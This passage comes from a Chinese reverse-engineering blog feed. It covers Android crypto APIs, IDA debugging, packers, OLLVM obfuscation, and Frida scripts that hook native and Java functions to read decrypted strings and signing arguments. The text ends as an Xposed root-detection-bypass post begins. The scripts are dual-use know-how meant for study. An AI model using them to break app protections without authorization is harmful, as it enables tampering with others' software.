id="4-3-2-熟悉非对称加解密的核心原理及RSA公钥加密私钥解密的源码实现"><a href="#4-3-2-熟悉非对称加解密的核心原理及RSA公钥加密私钥解密的源码实现" class="headerlink" title="4.3.2 熟悉非对称加解密的核心原理及RSA公钥加密私钥解密的源码实现"></a>4.3.2 熟悉非对称加解密的核心原理及RSA公钥加密私钥解密的源码实现</h2><h2 id="4-3-4-熟悉PGP-HTTPS-SSH等应用中混合使用多种加解密组合方式的细节"><a href="#4-3-4-熟悉PGP-HTTPS-SSH等应用中混合使用多种加解密组合方式的细节" class="headerlink" title="4.3.4 熟悉PGP/HTTPS/SSH等应用中混合使用多种加解密组合方式的细节"></a>4.3.4 熟悉PGP/HTTPS/SSH等应用中混合使用多种加解密组合方式的细节</h2><h2 id="4-3-5-熟悉秘钥的本质-安全交换的流程和场景-如何生成安全的秘钥"><a href="#4-3-5-熟悉秘钥的本质-安全交换的流程和场景-如何生成安全的秘钥" class="headerlink" title="4.3.5 熟悉秘钥的本质/安全交换的流程和场景/如何生成安全的秘钥"></a>4.3.5 熟悉秘钥的本质/安全交换的流程和场景/如何生成安全的秘钥</h2><h1 id="4-4-从框架层利用密码库"><a href="#4-4-从框架层利用密码库" class="headerlink" title="4.4 从框架层利用密码库"></a>4.4 从框架层利用密码库</h1><h2 id="4-4-1-熟悉安卓MessageDigest系列API的实现流程且导出输入输出"><a href="#4-4-1-熟悉安卓MessageDigest系列API的实现流程且导出输入输出" class="headerlink" title="4.4.1 熟悉安卓MessageDigest系列API的实现流程且导出输入输出"></a>4.4.1 熟悉安卓MessageDigest系列API的实现流程且导出输入输出</h2><p><strong>常用的算法名称有：MD2、MD5、SHA-1、SHA-256、SHA-384、SHA-512</strong></p><ol><li>MessageDigest介绍<br> MessageDigest 类是一个引擎类，它是为了提供诸如 SHA1 或 MD5 等密码上安全的报文摘要功能而设计的。密码上安全的报文摘要可接受任意大小的输入（一个字节数组），并产生固定大小的输出，该输出称为一个摘要或散列。摘要具有以下属性：<br> 无法通过计算找到两个散列成相同值的报文。<br> 摘要不反映任何与输入有关的内容。<br> 使用报文摘要可以生成数据唯一且可靠的标识符。有时它们被称为数据的“数字指纹”。</li></ol><p><strong>思路</strong><br>    (1)直接使用new MessageDigist( )来创建对象，而必须通过其静态方法getInstance( )生成MessageDigest对象。<br>    (2)x为需要计算的字符串，update传入的参数是字节类型或字节类型数组，对于字符串，需要先使用.<br>    (3)计算消息摘要,执行MessageDigest对象的digest( )方法完成计算，计算的结果通过字节类型的数组返回。<br>    (4)处理计算结果,必要的话可以使用如下代码将计算结果s转换为字符串。<br>    getBytes( )方法生成字符串数组。</p><h3 id="4-4-2-熟悉安卓Cipher系列API的实现流程并导出加解密的参数输入输出"><a href="#4-4-2-熟悉安卓Cipher系列API的实现流程并导出加解密的参数输入输出" class="headerlink" title="4.4.2 熟悉安卓Cipher系列API的实现流程并导出加解密的参数输入输出"></a>4.4.2 熟悉安卓Cipher系列API的实现流程并导出加解密的参数输入输出</h3><p><em>Cipher创建</em>：<br>    创建 Cipher 对象，应用程序调用 Cipher 的 getInstance 方法并将所请求转换的名称传递给它。还可以指定提供者的名称（可选）。<br>    转换是一个字符串，它描述为产生某种输出而在给定的输入上执行的操作（或一组操作）。转换始终包括加密算法的名称（例如AES，DES），后面可能跟有一个反馈模式和填充方案。<br><em>Cipher初始化</em>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> opmode, Key key)</span> <span class="comment">//用密钥初始化此 Cipher。</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    SecretKeySpec key </span>= <span class="keyword">new</span> SecretKeySpec(<span class="string">&quot;密钥&quot;</span>.getBytes(), <span class="string">&quot;AES&quot;</span>); <span class="comment">// 构建密钥</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ENCRYPT_MODE      <span class="comment">//  用于将 Cipher 初始化为加密模式的常量。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DECRYPT_MODE      <span class="comment">//  用于将 Cipher 初始化为解密模式的常量。</span></span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, key);</span><br></pre></td></tr></table></figure><p>    InvalidKeyException- 如果给定的 key 不适合初始化此 Cipher；如果此 Cipher 为解密初始化，并且所需算法参数无法从给定的 key 确定；如果给定 key 的键大小超出所允许的最大值（由已配置的仲裁策略文件确定）。</p><p><strong>AES</strong><br>加密关键代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher cipher = Cipher.getInstance(ALGORITHM_STR); <span class="comment">// 创建密码器</span></span><br><span class="line">            cipher.init(Cipher.ENCRYPT_MODE, key);<span class="comment">// 初始化</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> BASE64Encoder().encode(cipher.doFinal(data.getBytes(<span class="string">&quot;utf-8&quot;</span>)));</span><br></pre></td></tr></table></figure><p>解密关键代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher cipher = Cipher.getInstance(ALGORITHM_STR);</span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(cipher.doFinal(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(data)), <span class="string">&quot;utf-8&quot;</span>);</span><br></pre></td></tr></table></figure><p>q0o0p:</p><h3 id="4-4-3-熟悉安卓Mac系列API的实现流程并导出加解密的参数输入输出"><a href="#4-4-3-熟悉安卓Mac系列API的实现流程并导出加解密的参数输入输出" class="headerlink" title="4.4.3 熟悉安卓Mac系列API的实现流程并导出加解密的参数输入输出"></a>4.4.3 熟悉安卓Mac系列API的实现流程并导出加解密的参数输入输出</h3><h3 id="4-4-4-熟悉安卓crypto系列API和Native层openssl中常见算法的源码"><a href="#4-4-4-熟悉安卓crypto系列API和Native层openssl中常见算法的源码" class="headerlink" title="4.4.4 熟悉安卓crypto系列API和Native层openssl中常见算法的源码"></a>4.4.4 熟悉安卓crypto系列API和Native层openssl中常见算法的源码</h3><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>调试器通过执行“adb forward tcp:<hostport> jdwp:<pid>”命令将host机器上的hostport端口转发到Android上的调试进程，以便调试器通过这个端口连接到目标进程。</p><pre><code>android_server的作用类似于adbd，区别在于，adbd通过本地socket与JDWP进行通信，以转发调试信号；而android_server此处实际上是基于ptrace实现的一个调试器，它一端通过socket与IDA相连接，传输调试指令和数据，另一端通过ptrace直接操控调试进程。</code></pre><p>动态调试android的ndk程序的时候，发现很多程序都会反汇编错误，原来是ARM反汇编的模式没搞对。因为在动态调试的时候，ida Pro并没有去解析elf模块中的一些信息，造成了模块信息丢失，有时候反汇编就会错误。</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sub_ 指令和子函数起点</span><br><span class="line">locret_ 返回指令 </span><br><span class="line">loc_ 指令</span><br><span class="line">off_ 数据，包含偏移量</span><br><span class="line">seg_ 数据，包含段地址值</span><br><span class="line">asc_ 数据，ASCII字符串</span><br><span class="line">byte_ 数据，字节（或字节数组）</span><br><span class="line">word_ 数据，16位数据（或字数组）</span><br><span class="line">dword_ 数据，32位数据（或双字数组）</span><br><span class="line">qword_ 数据，64位数据（或4字数组）</span><br><span class="line">flt_ 浮点数据，32位（或浮点数组）</span><br><span class="line">dbl_ 浮点数，64位（或双精度数组）</span><br><span class="line">tbyte_ 浮点数，80位（或扩展精度浮点数）</span><br><span class="line">stru_ 结构体(或结构体数组)</span><br><span class="line">algn_ 对齐指示</span><br><span class="line">unk_ 未处理字节</span><br><span class="line"></span><br><span class="line">LDR&#123;条件&#125;   目的寄存器     &lt;存储器地址&gt;;将存储器地址所指地址处连续的4个字节（1个字）的数据传送到目的寄存器中。</span><br><span class="line">LDR R0，[R1，R2]!                                          ；将存储器地址为R1+R2的字数据读入寄存器R0，并将R1+R2的值存入R1。</span><br><span class="line">CMP（比较）指令执行从目的操作数中减去源操作数的隐含减法操作，并且不修改任何操作数：</span><br></pre></td></tr></table></figure><p>偏移后模块基地址 = 偏移前模块基地址 + ASLR偏移</p><h1 id="壳的发展"><a href="#壳的发展" class="headerlink" title="壳的发展"></a>壳的发展</h1><h2 id="第一代加固技术—动态加载"><a href="#第一代加固技术—动态加载" class="headerlink" title="第一代加固技术—动态加载"></a>第一代加固技术—动态加载</h2><p>用于保护应用的逻辑不被逆向与分析，主要基于Java虚拟机提供的动态加载技术。</p><p>其保护流程是：</p><p>开发阶段中将程序切分成加载（Loader）与关键逻辑（Payload）两部分，并分别打包；</p><p>运行时加载部分（Loader）会先运行，释放出关键逻辑（Payload），然后java的动态加载技术进行加载，并转交控制权。</p><hr><p>参考:<br><a href="https://blog.csdn.net/dutlxq2014/article/details/78078734">https://blog.csdn.net/dutlxq2014/article/details/78078734</a><br>jvm:<br><a href="https://blog.csdn.net/Strong997/article/details/80023864">https://blog.csdn.net/Strong997/article/details/80023864</a><br>JVM编译过程:<br><a href="https://blog.csdn.net/a550246215/article/details/106164810">https://blog.csdn.net/a550246215/article/details/106164810</a><br><a href="https://zhuanlan.zhihu.com/p/112427083">https://zhuanlan.zhihu.com/p/112427083</a></p><p>smali:<br><a href="https://blog.csdn.net/qq_41320638/article/details/104504730">https://blog.csdn.net/qq_41320638/article/details/104504730</a><br>xposed hook:<br><a href="https://blog.csdn.net/skillart/article/details/100104649">https://blog.csdn.net/skillart/article/details/100104649</a></p><p>脱壳:<br><a href="https://www.anquanke.com/post/id/197670">https://www.anquanke.com/post/id/197670</a><br>MD5:<br><a href="https://www.jianshu.com/p/b419163272c1">https://www.jianshu.com/p/b419163272c1</a><br>AES,DES:<br><a href="https://zhuanlan.zhihu.com/p/147009696">https://zhuanlan.zhihu.com/p/147009696</a></p><p>数字证书:<br><a href="https://zhuanlan.zhihu.com/p/330525206">https://zhuanlan.zhihu.com/p/330525206</a></p><p>TLS/KPI:<br><a href="https://zhuanlan.zhihu.com/p/103169222">https://zhuanlan.zhihu.com/p/103169222</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>简单介绍vmp，ollvm</title>
      <link href="/2021/04/07/vmp-ollvm/"/>
      <url>/2021/04/07/vmp-ollvm/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="固件和固件中的后门"><a href="#固件和固件中的后门" class="headerlink" title="固件和固件中的后门"></a>固件和固件中的后门</h2><p>什么是固件中的后门呢？固件后门是指，固件的开发人员或者恶意攻击者，可以利用所谓的后门，在未得到用户授权的条件下控制或完全控制设备。</p><p>听起来比较抽象，我们举个例子：一般来说，手机用户需要自行设置手机的解锁口令（比如密码、九宫格什么的），只有正确输入解锁口令才能解锁手机。然而，手机的固件中存在一个后门：只要输入一个特殊的口令就可以直接解锁手机。更隐蔽的方法可能是：按10次Home键，按3次增加音量键，再按2次减小音量键，就可以解锁手机。这就是所谓的后门了。</p><p>如果门禁系统有后门，攻击者可以通过后门打开门禁。当然，后门还可能是另一种形式：攻击者给门禁发送一个特殊的指令，门禁告诉攻击者用户那些时候开门了。这样一来，攻击者就可以把握用户的动向，判断用户是否在家。<br>如果智能电报有后门，攻击者或许可以篡改电表数字，让用户支付更多的电费。攻击者或许还可以知道用户用电量的趋势。如果某时刻用电量大，则判断用户在家；如果长时间用电量低，则判断用户出远门了。</p><h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>一个编译器,用来编译so和可执行文件等<br>它将源代码(.c或者.cpp或者.m等文件代码)生成与机器无关的中间代码，称之为IR。然后对产生的IR进行优化，生成对应的机器汇编语言。这和传统编译器前端，中间优化，后端的设计模式很相似。而不同之处在于，可以通过自定制前端或者后端来使之支持编译你的语言，对应的就是将源码转为中间IR代码，或者中间IR代码转为指定的机器代码，即只需要实现指定的前端后者后端即可。这就是LLVM强大的可扩展性。</p><p>对于LLVM来说，其前端是clang，在编译源码文件的时候使用的编译工具也是clang。而生成中间IR代码后需要对IR代码进行一些操作，例如添加一些代码混淆功能。LLVM的做法是通过编写Pass(其实就是对应的一个个类，每个类实现不同的功能)来实现混淆的功能。所以实现混淆，其实就是编写功能性的Pass。</p><h3 id="LLVM架构："><a href="#LLVM架构：" class="headerlink" title="LLVM架构："></a>LLVM架构：</h3><p>不同的前端后端使用统一的中间代码LLVM Intermediate Representation (LLVM IR)<br>如果需要支持一种新的编程语言，那么只需要实现一个新的前端<br>如果需要支持一种新的硬件设备，那么只需要实现一个新的后端<br>优化阶段是一个通用的阶段，它针对的是统一的LLVM IR，不论是支持新的编程语言，还是支持新的硬件设备，都不需要对优化阶段做修改（前后端都遵从统一的IR标准）<br>相比之下，GCC的前端和后端没分得太开，前端后端耦合在了一起。所以GCC为了支持一门新的语言，或者为了支持一个新的目标平台，就 变得特别困难<br>LLVM现在被作为实现各种静态和运行时编译语言的通用基础结构(GCC家族、Java、.NET、Python、Ruby、Scheme、Haskell、D等)</p><h2 id="OLLVM"><a href="#OLLVM" class="headerlink" title="OLLVM"></a>OLLVM</h2><p>　从名字上看，OLLVM比LLVM多了一个O，这个O就是obfuscator的简写</p><h3 id="OLLVM-4种混淆的方式；"><a href="#OLLVM-4种混淆的方式；" class="headerlink" title="OLLVM 4种混淆的方式；"></a>OLLVM 4种混淆的方式；</h3><pre><code>（1）Instructions Substitution：简单理解就是加减法、逻辑运算混淆（https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution）（2） Bogus Control Flow 虚假控制流（https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow）（3）Control Flow Flattening（https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening）（4）字符串加密：就是第2节开头举得那个例子！调用OLLVM提供的API，找到所有的字符串，然后根据业务需求挨个加密！</code></pre><p>　　最常见的混淆就是这种了，原理就是在不改变源代码的功能前提下，将C或C++代码中的if、while、for、do等控制语句转换成switch分支语句。这样做的好处是可以模糊switch中case代码块之间的关系，从而增加分析难度。具体做法是首先将要实现平坦化的方法分成多个基本块（就是case代码块）和一个入口块，为每个基本快编号，并让这些基本块都有共同的前驱模块和后继模块。前驱模块主要是进行基本块的分发，分发通过改变switch变量来实现。后继模块也可用于更新switch变量的值，并跳转到switch开始处</p><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p>（1）先拿最简单的字符串加密/混淆举例：常见的字符串加密方式是异或，然后在init_array里面解密；有耐心的同学可以尝试在init_array去分析代码，看看能不能找到key后解密字符串；这里其实还有更简单的办法：直接用frida hook字符串的地址后打印出来即可，脚本如下：findBaseAddress的参数传入so的名称，得到so在内存的基址；add函数传入字符串在so内部的偏移，得到字符串的绝对地址；然后直接用log函数把地址的数据打印出来即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base_hello_jni = Module.findBaseAddress(<span class="string">&quot;libhello-jni.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (base_hello_jni) &#123;</span><br><span class="line">        <span class="comment">//ollvm默认的字符串混淆，静态的时候没法看见字符串</span></span><br><span class="line">        <span class="comment">//执行起来之后，先调用.init_array里面的函数来解密字符串</span></span><br><span class="line">        <span class="comment">//解密完之后，内存中的字符串就是明文状态了。</span></span><br><span class="line">        <span class="keyword">var</span> addr_37070 = base_hello_jni.add(<span class="number">0x37070</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;addr_37070:&quot;</span>, ptr(addr_37070).readCString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者通过frida -U传入字符串首地址的偏移：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_string</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base_hello_jni = Module.findBaseAddress(<span class="string">&quot;libhello-jni.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_str = base_hello_jni.add(addr);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;addr:&quot;</span>, addr, <span class="string">&quot; &quot;</span>, ptr(addr_str).readCString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态注册时java层函数和native层函数映射关系的JNINativeMethod，简单的打印函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.attach(addr_RegisterNatives, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;addr_RegisterNatives:&quot;</span>, hexdump(args[<span class="number">2</span>]));    <span class="comment">//打印第三个参数，也就是java和native映射的数组首地址</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;addr_RegisterNatives name:&quot;</span>, ptr(args[<span class="number">2</span>]).readPointer().readCString())<span class="comment">//java层函数名称</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;addr_RegisterNatives sig:&quot;</span>, ptr(args[<span class="number">2</span>]).add(Process.pointerSize).readPointer().readCString());<span class="comment">//函数参数</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;addr_RegisterNatives sig:&quot;</span>, ptr(args[<span class="number">2</span>]).add(Process.pointerSize+Process.pointerSize));<span class="comment">//native函数入口地址</span></span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>（2）控制流平坦化（虚假控制流原理类似：这两种方式都是对控制流做文章的，都是改变了原控制流，只是改变的方式不同，两者没本质区别）：平日见的最多的就是这种混淆方式了！这种方式说白了就是把if、while、for、do等控制语句改造成switch、case，让case之间看不出明显的逻辑关系；每个case执行完后更改“信号量”，以此决定下一次循环走那个case；这种混淆方式平白无故增加了很多无用的case分支，但是绝对不敢乱改原来的函数调用关系！所以即使被用这种方式混淆，但原来的函数调用还是真实的！基于这点，可以根据经验筛选出一些重点函数来hook，看看这些函数的参数都是啥，都返回了什么，以此来猜测这些函数的功能！常见的so层js hook代码（java层建议直接用objection，非常方便）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_sign2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> HelloJni = Java.use(<span class="string">&quot;com.example.hellojni.HelloJni&quot;</span>);</span><br><span class="line">        HelloJni.sign2.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str, str2</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="built_in">this</span>.sign2(str, str2);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;HelloJni.sign2:&quot;</span>, str, str2, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果函数是静态注册的，就不用去IDA手动查函数偏移了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sign2 = Module.findExportByName(<span class="string">&quot;libhello-jni.so&quot;</span>, <span class="string">&quot;Java_com_example_hellojni_HelloJni_sign2&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(sign2);</span><br><span class="line">    Interceptor.attach(sign2, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//jstring</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sign2 str1:&quot;</span>, ptr(Java.vm.tryGetEnv().getStringUtfChars(args[<span class="number">2</span>])).readCString());</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sign2 str2:&quot;</span>, ptr(Java.vm.tryGetEnv().getStringUtfChars(args[<span class="number">3</span>])).readCString());</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sign2 retval:&quot;</span>, ptr(Java.vm.tryGetEnv().getStringUtfChars(retval)).readCString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>　有些函数是通过参数保存返回值的，比如sub_1AB4C(v1,v2,&amp;v3)这种，把V3的地址传入函数，并且V3在后续的代码也被使用了，所以这里有可能是V3保存了函数的处理结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sub_1AB4C = base_hello_jni.add(<span class="number">0x1AB4C</span>);</span><br><span class="line">        Interceptor.attach(sub_1AB4C, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.arg2 = args[<span class="number">2</span>];　　　　　　　　　 <span class="built_in">this</span>.arg8 = <span class="built_in">this</span>.context.x8;<span class="comment">//注意这里还可以读取寄存器</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;sub_1AB4C onEnter:&quot;</span>, hexdump(args[<span class="number">0</span>]), args[<span class="number">1</span>], <span class="string">&quot;\r\n&quot;</span>, hexdump(args[<span class="number">2</span>]));</span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;sub_1AB4C onLeave:&quot;</span>, hexdump(retval), <span class="string">&quot;\r\n&quot;</span>, hexdump(<span class="built_in">this</span>.arg2));<span class="comment">//args[2]传参时取了地址，在后面也会用到，所以这个参数有可能保存了返回值，这里打印出来看看</span></span><br><span class="line">　　　　　　　　　 <span class="built_in">console</span>.log(<span class="string">&quot;sub_1AB4C onLeave:&quot;</span>, hexdump(<span class="built_in">this</span>.arg8))</span><br><span class="line">　　　　　　　　&#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><h1 id="二进制自动化分析工具"><a href="#二进制自动化分析工具" class="headerlink" title="二进制自动化分析工具"></a>二进制自动化分析工具</h1><h2 id="1-angr"><a href="#1-angr" class="headerlink" title="1.angr"></a>1.angr</h2><p><a href="http://angr.io/">http://angr.io/</a><br><a href="https://github.com/angr">https://github.com/angr</a></p><h2 id="2-Pin插桩"><a href="#2-Pin插桩" class="headerlink" title="2.Pin插桩"></a>2.Pin插桩</h2><p>Pin 是 Intel 公司研发的一个动态二进制插桩框架，可以在二进制程序运行过程中插入各种函数，以监控程序每一步的执行。</p><p>插桩技术：在不改变程序原有运行顺序的基础下，在程序中插入一些用来进行信息记录的探针，通过探针的执行使程序自动抛出一些信息，再加以对这些信息的分析，获得程序控制流和数据流的信息。分为源代码插桩和二进制插桩。<br>源码插桩：修改源代码，插入额外的代码，我们日常调试程序中打log的方法就是源代码插桩。<br>二进制插桩：分为静态二进制插桩和动态二进制插桩。<br>静态二进制插桩：插入额外的汇编代码，生成一个新的可执行程序。<br>动态二进制插桩：用动态库的方式，运行时动态的注入代码，不会改变原有二进制程序。<br>Pin可以用于对可执行程序进行运行时动态插桩来分析程序的运行信息。它支持Linux，macOS，Windows等多个平台和IA-32，Intel(R) 64等指令架构。在官方文档中Pin可以理解一种“just in time”编译器，只不过编译的是常规的可执行文件，而不是字节码。</p><p>最细粒度的就是instruction instrumentation即指令级插桩，它可以遍历程序执行的指令，很适合初学者使用。</p><hr><p>参考:<br><a href="https://www.cnblogs.com/theseventhson/p/14861940.html">https://www.cnblogs.com/theseventhson/p/14861940.html</a><br>registerNative打印函数：<a href="https://github.com/lasting-yang/frida_hook_libart">https://github.com/lasting-yang/frida_hook_libart</a>   或  <a href="https://www.52pojie.cn/thread-1182860-1-1.html">https://www.52pojie.cn/thread-1182860-1-1.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Xposed Hook技术及root检测绕过</title>
      <link href="/2021/03/30/Xposed-hook/"/>
      <url>/2021/03/30/Xposed-hook/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Xposed-Hook原理及运用"><a href="#Xposed-Hook原理及运用" class="headerlink" title="Xposed Hook原理及运用"></a>Xposed Hook原理及运用</h1><p>安装好的Xposed在重启手机过程中 通过替换/system/bin/app_process的程序 控制zygote进程，同时在app_process启动过程中会加载XposedBridge.jar这个包 (里面是后面说到的xposed api代码), 让基于Xposed开发的模块app们 都能使用XposedBridge.jar里的api (像android.jar那样, 后面会说到如何使用)，然后对Zygote进程和Dalvik虚拟机进行劫持。</p><h2 id="Zygote原理"><a href="#Zygote原理" class="headerlink" title="Zygote原理"></a>Zygote原理</h2><p>在Android系统中App进程都是由Zygote进程fork出来的。Zygote进程在启动时会创建一个虚拟机实例，每当它fork一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的App进程里面去，从而使每个App进程都有一个独立的Dalvik虚拟机实例。</p><p>Zygote进程在启动的过程中，除了会创建一个虚拟机实例之外还会将Java Rumtime加载到进程中并注册一些Android核心类的JNI（Java Native Interface，Java本地接口）方法。一个App进程被Zygote进程fork出来的时候，不仅会获得Zygote进程中的虚拟机实例拷贝，还会与Zygote进程一起共享Java Rumtime，也就是可以将XposedBridge.jar这个Jar包加载到每一个Android App进程中去。安装Xposed Installer之后，系统app_process将被替换，然后利用Java的Reflection机制覆写内置方法，实现功能劫持。下面我们来看一下细节。</p><h2 id="Hook和Replace"><a href="#Hook和Replace" class="headerlink" title="Hook和Replace"></a>Hook和Replace</h2><p>Xposed 